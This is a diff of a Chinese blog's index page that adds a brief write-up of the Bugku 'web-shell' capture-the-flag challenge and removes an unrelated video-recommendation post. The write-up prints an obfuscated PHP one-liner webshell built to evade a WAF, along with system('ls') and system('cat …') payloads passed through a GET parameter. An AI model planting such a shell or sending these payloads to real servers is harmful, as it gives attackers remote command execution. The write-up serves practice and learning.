@@ -164,6 +164,100 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-bugku-web-shell" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/09/bugku-web-shell/">bugku-web-shell</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/08/09/bugku-web-shell/" class="archive-article-date">
+  	<time datetime="2021-08-09T12:26:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>看提示——送给大家一个过狗一句话 $poc=”a#s#s#e#r#t”; $poc_1=explode(“#”,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[‘s’])</p>
+<p>简单来讲就是assert($_GET[‘s’])</p>
+<p>assert函数会把里面的内容当成php代码执行</p>
+<p>所以直接传值：s=system(“ls”)<br>发现目录</p>
+<img src="/2021/08/09/bugku-web-shell/1.PNG" class="" title="1.PNG">
+
+<p>然后传：s=system(“cat flaga15808abee46a1d5.txt”)<br>得到flag</p>
+<img src="/2021/08/09/bugku-web-shell/2.PNG" class="" title="2.PNG">
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/09/bugku-web-shell/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-bugku-web-never-give-up" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -985,95 +1079,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/08/04/buu-easyweb/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-视频推荐" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/02/%E8%A7%86%E9%A2%91%E6%8E%A8%E8%8D%90/">视频推荐</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/02/%E8%A7%86%E9%A2%91%E6%8E%A8%E8%8D%90/" class="archive-article-date">
-  	<time datetime="2021-08-02T13:10:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>docker（对我来说语速最舒服，普通话最好的老师之一，不背稿现场发挥的良心老师，但是有打鸡血嫌疑，前一部分适当跳过吧，但是那也比机构老师拖时间舒服多了）：<br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1og4y1q7M4?from=search&amp;seid=15506386515153261111">https://www.bilibili.com/video/BV1og4y1q7M4?from=search&amp;seid=15506386515153261111</a></p>
-<p>服务器购买：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV177411K7bH">https://www.bilibili.com/video/BV177411K7bH</a><br>云翼计划：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/plan/grow-up">https://developer.aliyun.com/plan/grow-up</a><br>免费试用：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/adc/student/?spm=5176.10695662.3291411370.2.b3115a060G0pWR">https://developer.aliyun.com/adc/student/?spm=5176.10695662.3291411370.2.b3115a060G0pWR</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/02/%E8%A7%86%E9%A2%91%E6%8E%A8%E8%8D%90/">展开全文 >></a>
         </p>
       
 
